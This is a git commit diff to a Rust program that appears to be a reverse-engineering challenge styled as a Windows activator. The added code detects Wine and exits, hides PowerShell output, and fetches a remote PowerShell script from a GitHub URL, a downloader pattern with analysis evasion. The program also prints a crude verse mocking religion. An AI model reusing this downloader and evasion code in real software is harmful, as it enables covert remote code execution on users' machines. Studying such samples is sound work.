7850b2301c3e93d143f440730d5fccf34ea11f5b
Faruk <farukomererdem2003@gmail.com>
2025-03-04 16:12:54 +0300

    Wine control

--- reverse/rust-reverse/src/main.rs
+++ reverse/rust-reverse/src/main.rs
@@ -1,6 +1,17 @@
-use rand::{distributions::Alphanumeric, prelude, Rng};
+use libloading::Library;
+use rand::{distributions::Alphanumeric, Rng};
 use reqwest;
 use std::process::{Command, Output};
+fn is_running_under_wine() -> bool {
+    unsafe {
+        if let Ok(lib) = Library::new("ntdll.dll") {
+            let func: libloading::Symbol<unsafe extern "C" fn() -> *const i8> =
+                lib.get(b"wine_get_version").unwrap();
+            return !func().is_null();
+        }
+    }
+    false
+}
 
 fn generate_key() -> String {
     let random_string: String = rand::thread_rng()
@@ -10,29 +21,40 @@ fn generate_key() -> String {
         .collect();
 
     let hash = md5::compute(random_string.as_bytes());
-    let hash_hex = format!("{:x}", hash);
-    hash_hex
+    let output = format!("ABİ{{{:?}}}", hash);
+    output
 }
 
 fn run_command(command: &String) -> Output {
+    let output;
     if cfg!(target_os = "windows") {
-        Command::new("powershell")
+        output = Command::new("powershell")
             .arg("-Commanda")
             .arg(command)
+            .arg("|")
+            .arg("Out-Null")
             .output()
             .expect("Run command again!")
     } else {
-        println!("{}", command);
-        Command::new("bash")
-            .arg("-c")
-            .arg(command)
-            .output()
-            .expect("Run command again!")
+        println!("Can't activate Windows on this OS dumbass!");
+        std::process::exit(0);
     }
+    output
 }
 
 #[tokio::main]
 async fn main() {
+    if is_running_under_wine() {
+        println!(
+            "
+ırmaklarından şaraplar akacak diyorsun
+cennet-i alâ meyhane midir?
+her mümin'e iki huri diyorsun
+cennet-i alâ kerhane midir? 
+            "
+        );
+        std::process::exit(0);
+    }
     let url = "https://raw.githubusercontent.com/El0mar/legendary-train/refs/heads/main/script.ps1";
     let windows_key = generate_key();
     match reqwest::get(url).await {
